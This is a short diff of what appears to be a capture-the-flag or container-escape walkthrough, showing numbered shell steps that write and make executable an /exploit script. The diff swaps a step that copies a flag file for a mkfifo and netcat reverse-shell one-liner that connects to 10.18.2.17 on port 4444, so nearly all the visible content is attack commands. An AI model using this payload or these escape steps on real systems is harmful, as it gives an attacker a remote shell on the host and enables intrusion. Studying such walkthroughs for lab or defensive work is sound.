@@ -16,7 +16,7 @@
 
 #### 5.  echo '#!/bin/sh' > /exploit
 
-#### 6.  echo "cat /home/user/flag.txt > $host_path/flag.txt" >> /exploit
+#### 6.  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.2.17 4444 >/tmp/f" >> /exploit
 
 #### 7.  chmod a+x /exploit
 
